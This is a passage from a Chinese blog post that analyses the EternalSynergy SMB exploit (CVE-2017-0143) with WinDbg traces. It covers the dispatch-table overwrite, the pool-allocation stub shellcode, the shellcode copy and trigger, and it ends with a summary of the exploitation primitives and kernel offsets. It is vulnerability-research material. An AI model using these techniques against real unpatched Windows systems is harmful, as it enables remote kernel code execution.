<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2cf:</span><br><span class="line">fffff880`0507e37f e8bc34f8ff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; dqs rcx</span><br><span class="line">fffff800`1ae8f000  00000000`00000000</span><br><span class="line">fffff800`1ae8f008  00000000`00000000</span><br><span class="line">fffff800`1ae8f010  00000000`00000000</span><br><span class="line">fffff800`1ae8f018  00000000`00000000</span><br><span class="line">fffff800`1ae8f020  00000000`00000000</span><br><span class="line">fffff800`1ae8f028  00000000`00000000</span><br><span class="line">fffff800`1ae8f030  00000000`00000000</span><br><span class="line">fffff800`1ae8f038  00000000`00000000</span><br><span class="line">fffff800`1ae8f040  00000000`00000000</span><br><span class="line">fffff800`1ae8f048  00000000`00000000</span><br><span class="line">fffff800`1ae8f050  00000000`00000000</span><br><span class="line">fffff800`1ae8f058  00000000`00000000</span><br><span class="line">fffff800`1ae8f060  00000000`00000000</span><br><span class="line">fffff800`1ae8f068  00000000`00000000</span><br><span class="line">fffff800`1ae8f070  00000000`00000000</span><br><span class="line">fffff800`1ae8f078  00000000`00000000</span><br><span class="line">kd&gt; dqs rdx</span><br><span class="line">fffffa80`1d4910d2  00002025`048b4865</span><br><span class="line">fffffa80`1d4910da  31000008`b0054800</span><br><span class="line">fffffa80`1d4910e2  48000000`1e158bc9</span><br><span class="line">fffffa80`1d4910ea  c4834810`ff20ec83</span><br><span class="line">fffffa80`1d4910f2  05894807`74c08520</span><br><span class="line">fffffa80`1d4910fa  000000c3`00000001</span><br><span class="line">fffffa80`1d491102  000e4d00`00000000</span><br><span class="line">fffffa80`1d49110a  2a969ca5`ecab4b00</span><br><span class="line">fffffa80`1d491112  a9de88cb`491de58a</span><br><span class="line">fffffa80`1d49111a  3801ef46`5ee55211</span><br><span class="line">fffffa80`1d491122  dd8aaf7b`a51450d2</span><br><span class="line">fffffa80`1d49112a  9014a39f`e9ac2946</span><br><span class="line">fffffa80`1d491132  e988be8a`6a2841cd</span><br><span class="line">fffffa80`1d49113a  d4368226`6aae25f2</span><br><span class="line">fffffa80`1d491142  d175284b`b478ce65</span><br><span class="line">fffffa80`1d49114a  c52f5324`db21de6f</span><br><span class="line">kd&gt; r r8</span><br><span class="line">r8=0000000000000039</span><br></pre></td></tr></table></figure>

<p>数据包体现</p>
<p><img src="./images/1505270562824.jpg" alt></p>
<p>复制了上面这些数据后，再将目标transaction的InData指针替换为<code>fffff8800501a990</code>：srv!SrvTransaction2DispatchTable+0x70，为改写这个表做准备</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2cf:</span><br><span class="line">fffff880`0507e37f e8bc34f8ff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; dqs rdx</span><br><span class="line">fffffa80`1d495262  fffff880`0501a990 srv!SrvTransaction2DispatchTable+0x70</span><br><span class="line">fffffa80`1d49526a  00000000`00000004</span><br><span class="line">fffffa80`1d495272  00000000`00000000</span><br><span class="line">fffffa80`1d49527a  00000000`00000010</span><br><span class="line">fffffa80`1d495282  00000002`00000000</span><br><span class="line">fffffa80`1d49528a  4e414c02`00323030</span><br><span class="line">fffffa80`1d495292  0200312e`324e414d</span><br><span class="line">fffffa80`1d49529a  2e30204d`4c20544e</span><br><span class="line">fffffa80`1d4952a2  00000000`00003231</span><br><span class="line">fffffa80`1d4952aa  00000000`00000000</span><br><span class="line">fffffa80`1d4952b2  00000000`00000000</span><br><span class="line">fffffa80`1d4952ba  00000000`00000000</span><br><span class="line">fffffa80`1d4952c2  00000000`00000000</span><br><span class="line">fffffa80`1d4952ca  00000000`00000000</span><br><span class="line">fffffa80`1d4952d2  00000000`00000000</span><br><span class="line">fffffa80`1d4952da  00000000`00000000</span><br><span class="line">kd&gt; dqs rcx</span><br><span class="line">fffff8a0`05c5f2f0  fffff800`1ae8f000 nt!KxUnexpectedInterrupt0</span><br><span class="line">fffff8a0`05c5f2f8  fffff8a0`05c5fffc</span><br><span class="line">fffff8a0`05c5f300  00000000`00000000</span><br><span class="line">fffff8a0`05c5f308  00000000`00000000</span><br><span class="line">fffff8a0`05c5f310  00000325`00000c50</span><br><span class="line">fffff8a0`05c5f318  00000000`00001000</span><br><span class="line">fffff8a0`05c5f320  00000101`00000000</span><br><span class="line">fffff8a0`05c5f328  0800226e`08000000</span><br><span class="line">fffff8a0`05c5f330  00000000`00000000</span><br><span class="line">fffff8a0`05c5f338  00000000`00000000</span><br><span class="line">fffff8a0`05c5f340  00000000`00000000</span><br><span class="line">fffff8a0`05c5f348  00000000`00000000</span><br><span class="line">fffff8a0`05c5f350  00000000`00010101</span><br><span class="line">fffff8a0`05c5f358  00000000`00000000</span><br><span class="line">fffff8a0`05c5f360  00000000`00000000</span><br><span class="line">fffff8a0`05c5f368  00480000`00650000</span><br></pre></td></tr></table></figure>

<p>接下来就可以修改srv!SrvTransaction2DispatchTable+0x70的位置为nt!KxUnexpectedInterrupt0了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2cf:</span><br><span class="line">fffff880`0507e37f e8bc34f8ff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; r r8</span><br><span class="line">r8=0000000000000008</span><br><span class="line">kd&gt; dqs rdx l1</span><br><span class="line">fffffa80`1d495262  fffff800`1ae8f000 nt!KxUnexpectedInterrupt0</span><br><span class="line">kd&gt; dqs rcx l1</span><br><span class="line">fffff880`0501a990  fffff880`050796e8 srv!SrvTransactionNotImplemented</span><br></pre></td></tr></table></figure>

<p>一开始不知道为什么复制这些数据到那里，又要修改SrvTransaction2DispatchTable+0x70，后来下断点发现调用了这里的代码，原来这个数据也算是一个小shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nt!KxUnexpectedInterrupt0:</span><br><span class="line">fffff800`1ae8f000 65488b042520000000 mov   rax,qword ptr gs:[20h] gs:002b:00000000`00000020=fffff8001af14180</span><br><span class="line">fffff800`1ae8f009 4805b0080000    add     rax,8B0h</span><br><span class="line">fffff800`1ae8f00f 31c9            xor     ecx,ecx</span><br><span class="line">fffff800`1ae8f011 8b151e000000    mov     edx,dword ptr [nt!KxUnexpectedInterrupt0+0x35 (fffff800`1ae8f035)]</span><br><span class="line">fffff800`1ae8f017 4883ec20        sub     rsp,20h</span><br><span class="line">fffff800`1ae8f01b ff10            call    qword ptr [rax]</span><br><span class="line">fffff800`1ae8f01d 4883c420        add     rsp,20h</span><br><span class="line">fffff800`1ae8f021 85c0            test    eax,eax</span><br><span class="line">fffff800`1ae8f023 7407            je      nt!KxUnexpectedInterrupt0+0x2c (fffff800`1ae8f02c)</span><br><span class="line">fffff800`1ae8f025 48890501000000  mov     qword ptr [nt!KxUnexpectedInterrupt0+0x2d (fffff800`1ae8f02d)],rax</span><br><span class="line">fffff800`1ae8f02c c3              ret</span><br></pre></td></tr></table></figure>

<p>原来这里调用了分配pool内存的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffff800`1ae8f01b ff10            call    qword ptr [rax] ds:002b:fffff800`1af14a30=&#123;nt!ExAllocatePoolWithTag (fffff800`1ae8d040)&#125;</span><br></pre></td></tr></table></figure>

<p>大小是e4d（这个跟下面shellcode的大小是一致的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r rcx;r rdx;r r8</span><br><span class="line">rcx=0000000000000000</span><br><span class="line">rdx=0000000000000e4d</span><br><span class="line">r8=fffffa801decf450</span><br></pre></td></tr></table></figure>

<p>最后将分配的内存首地址复制给nt!KxUnexpectedInterrupt0+0x2d</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nt!KxUnexpectedInterrupt0+0x25:</span><br><span class="line">fffff800`1ae8f025 48890501000000  mov     qword ptr [nt!KxUnexpectedInterrupt0+0x2d (fffff800`1ae8f02d)],rax</span><br><span class="line">kd&gt; r rax</span><br><span class="line">rax=fffffa8018e2e010</span><br></pre></td></tr></table></figure>

<p>之后就会读取nt!KxUnexpectedInterrupt0+0x2d的值，再向这个读取到的地址写入shellcode。（调试过程也看到要泄露nt!KxUnexpectedInterrupt0+0x2d的值，到这里就明白了）</p>
<h2 id="shellcode的写入"><a href="#shellcode的写入" class="headerlink" title="shellcode的写入"></a>shellcode的写入</h2><p>下断点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp srv!SrvSmbTransactionSecondary+0x2cf &quot;r r8;dqs rdx;.echo *****;dqs rcx;.echo -------------------;gc&quot;</span><br></pre></td></tr></table></figure>

<p>首先将一个transaction的InData改写为<code>fffffa8018e8e010</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r8=0000000000000008</span><br><span class="line">fffffa80`1decf492  fffffa80`18e8e010</span><br><span class="line">......</span><br><span class="line">*****</span><br><span class="line">fffff8a0`0295c2f0  fffff8a0`0288c170</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>之后向<code>fffffa8018e8e010</code>复制shellcode（我将shellcode前面改为0xcc开头了，好辨别）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">r8=0000000000000e4d</span><br><span class="line">fffffa80`1d4910d2  ccccc300`000001e8</span><br><span class="line">fffffa80`1d4910da  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d4910e2  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d4910ea  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d4910f2  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d4910fa  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d491102  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d49110a  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d491112  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d49111a  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d491122  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d49112a  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d491132  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d49113a  cccccccc`cccccccc</span><br><span class="line">fffffa80`1d491142  019fcccc`cccccccc</span><br><span class="line">fffffa80`1d49114a  14b95ba4`45890000</span><br><span class="line">*****</span><br><span class="line">fffffa80`18e8e010  00000000`00000000</span><br><span class="line">fffffa80`18e8e018  54bde856`dffbacaa</span><br><span class="line">fffffa80`18e8e020  820890aa`408fa7fc</span><br><span class="line">fffffa80`18e8e028  cc191a94`8d615dfb</span><br><span class="line">fffffa80`18e8e030  55f0bdc2`c159734b</span><br><span class="line">fffffa80`18e8e038  1a4e964d`3060b970</span><br><span class="line">fffffa80`18e8e040  c95d31de`28434a9d</span><br><span class="line">fffffa80`18e8e048  5b34921b`9f1c681c</span><br><span class="line">fffffa80`18e8e050  082dddca`859bf538</span><br><span class="line">fffffa80`18e8e058  5e4f0e40`e0079508</span><br><span class="line">fffffa80`18e8e060  6ba205e4`70890952</span><br><span class="line">fffffa80`18e8e068  779b5234`8a685c21</span><br><span class="line">fffffa80`18e8e070  1f95de82`06f96739</span><br><span class="line">fffffa80`18e8e078  13c4aeac`e812a79c</span><br><span class="line">fffffa80`18e8e080  4f257902`8c95f77d</span><br><span class="line">fffffa80`18e8e088  2be47417`95c0b867</span><br></pre></td></tr></table></figure>

<p>shellcode前面的字节是软件作者自己加到shellcode前面的，其实就是跳转到shellcode，这样不知有什么好处</p>
<p><img src="./images/1505368813059.jpg" alt></p>
<h2 id="触发shellcode的执行"><a href="#触发shellcode的执行" class="headerlink" title="触发shellcode的执行"></a>触发shellcode的执行</h2><p>先将那个transaction的InData改为srv!SrvTransaction2DispatchTable+0x70</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r8=0000000000000008</span><br><span class="line">fffffa80`1d495262  fffff880`0501a990 srv!SrvTransaction2DispatchTable+0x70</span><br><span class="line">......</span><br><span class="line">*****</span><br><span class="line">fffff8a0`0295c2f0  fffffa80`18e8e010</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>之后在srv!SrvTransaction2DispatchTable+0x70处写入shellcode地址（<code>fffffa8018e8e010</code>）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r8=0000000000000008</span><br><span class="line">fffffa80`1e2f7492  fffffa80`18e8e010</span><br><span class="line">......</span><br><span class="line">*****</span><br><span class="line">fffff880`0501a990  fffff800`1ae8f000 nt!KxUnexpectedInterrupt0</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>最后发送一个command为0x32的包，触发那个表中的函数调用</p>
<p><img src="./images/1505372283620.jpg" alt></p>
<h1 id="漏洞分析总结"><a href="#漏洞分析总结" class="headerlink" title="漏洞分析总结"></a>漏洞分析总结</h1><ol>
<li>本工具主要利用SrvSmbTransactionSecondary中的memmove从而覆盖另一个transaction的OutData指针和InData地址从而到达任意地址写和任意地址读的漏洞</li>
<li>也利用了nt rename，之后利用RestartTransactionResponse的memmove覆盖另一个OutData指针</li>
<li>通过改写SrvNtTransactionDispatchTable的0x70偏移达到执行任意代码的目的</li>
<li>还有一段小shellcode，去分配pool内存</li>
<li>之后泄露pool内存的地址</li>
<li>最后将真正的shellcode复制到那个内存，最后触发shellcode执行</li>
</ol>
<h1 id="分析smb漏洞的一些总结"><a href="#分析smb漏洞的一些总结" class="headerlink" title="分析smb漏洞的一些总结"></a>分析smb漏洞的一些总结</h1><ol>
<li>nt trans request是用nt的函数来处理的，否则是不带nt的函数来处理（例子 SrvSmbNtTransactionSecondary和SrvSmbTransactionSecondary）</li>
<li>nt trans request最后发送给客户端的时候是用SrvStartSend，不带nt的request使用的是SrvStartSend2</li>
<li>在64位系统的情况下 transaction的结构如下：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct transaction&#123;</span><br><span class="line">    0x70 ParametersIn</span><br><span class="line">    0x78 ParametersOut</span><br><span class="line">    0x80 InData</span><br><span class="line">    0x88 OutData</span><br><span class="line">    0xa0 Dataoffset   //不是100%肯定</span><br><span class="line">    0xa4 DataCount </span><br><span class="line">    0xa8 DataDisplacement //不是100%肯定</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    0xba Tid              </span><br><span class="line">    0xbc Pid              </span><br><span class="line">    0xbe Uid           </span><br><span class="line">    0xc0 OtherInfo  </span><br><span class="line"></span><br><span class="line">    0xd0 指向第一次回应的smb全部数据</span><br><span class="line">    0xd8 可能指向第一次回应的smb的body部分，就只header之后</span><br><span class="line">    0xdc 可能是第一个回应包的DataCount（就是有Secondary的数据包的情况下）</span><br><span class="line"></span><br><span class="line">    0xf0 Secondaryd的COMMAND值</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SrvSmbTransactionSecondary的第一个参数偏移</span><br><span class="line">0xc0 当前request的所有数据</span><br><span class="line">0xc8 当前request的body部分</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>CONNECTION地址的0x78偏移处储存的是PreferredWorkQueue</li>
<li>PreferredWorkQueue+0x198偏移处储存的是IrpThread</li>
<li>IrpThread+0x220偏移储存的是KProcess</li>
<li>KProcess+0x240偏移存储的是nt!KiProcessListHead（ProcessListEntry.Blink）</li>
<li>Nt的基址在nt!KiProcessListHead前面，本工具从nt!KiProcessListHead-0x2cfc80开始寻找</li>
<li>怎么确认找到了Nt的基址呢？就凭两个字节，就是MZ头，😄</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blogs.technet.microsoft.com/srd/2017/07/13/eternal-synergy-exploit-analysis/" target="_blank" rel="noopener">https://blogs.technet.microsoft.com/srd/2017/07/13/eternal-synergy-exploit-analysis/</a></p>
<p><a href="http://blogs.360.cn/360safe/2017/04/19/eternalromance-analyze/" target="_blank" rel="noopener">http://blogs.360.cn/360safe/2017/04/19/eternalromance-analyze/</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>打赏专区</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="http://pic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="http://pic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    
    
      <div class="footer-custom">
        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
      </div>
    

    
    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
    	<div><img src="http://pic.giantbranch.cn/ask.png"></div>
    </div>
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    giantbranch
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/" title="Eternalsynergy利用的漏洞分析（CVE-2017-0143）">https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
          
            <a href="/tags/nsa工具/" rel="tag"># nsa工具</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/08/31/翻译——在windbg的帮助下解剖.NET/" rel="next" title="翻译——在windbg的帮助下解剖.NET">
                <i class="fa fa-chevron-left"></i> 翻译——在windbg的帮助下解剖.NET
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/09/18/gdb命令总结/" rel="prev" title="gdb命令总结">
                gdb命令总结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
        
  <div class="bdsharebuttonbox">
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
    <a href="#" class="bds_more" data-cmd="more"></a>
    <a class="bds_count" data-cmd="count"></a>
  </div>
  <script>
    window._bd_share_config = {
      "common": {
        "bdText": "",
        "bdMini": "2",
        "bdMiniList": false,
        "bdPic": ""
      },
      "share": {
        "bdSize": "16",
        "bdStyle": "0"
      },
      "image": {
        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
        "viewText": "分享到：",
        "viewSize": "16"
      }
    }
  </script>

<script>
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

      
    </div>
    <div class="footer-custom">
	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
    </div>
  </div>


          </div>
          


          
  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>
  


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">giantbranch</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">198</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">234</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
                    
                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具利用复现"><span class="nav-number">2.</span> <span class="nav-text">工具利用复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#初步漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">初步漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#判断系统位数"><span class="nav-number">4.</span> <span class="nav-text">判断系统位数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息泄露数据包体现"><span class="nav-number">5.</span> <span class="nav-text">信息泄露数据包体现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息泄露原理"><span class="nav-number">6.</span> <span class="nav-text">信息泄露原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理简述"><span class="nav-number">6.1.</span> <span class="nav-text">原理简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过SrvFindTransaction看信息泄露"><span class="nav-number">6.2.</span> <span class="nav-text">通过SrvFindTransaction看信息泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露CONNECTION地址"><span class="nav-number">6.3.</span> <span class="nav-text">泄露CONNECTION地址</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#处理第一个包"><span class="nav-number">6.3.1.</span> <span class="nav-text">处理第一个包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#处理第二个包secondary包"><span class="nav-number">6.3.2.</span> <span class="nav-text">处理第二个包secondary包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露-SRV-global-data-pointer"><span class="nav-number">6.4.</span> <span class="nav-text">泄露 SRV global data pointer</span></a></li><li class="nav-item nav-level-2"><a 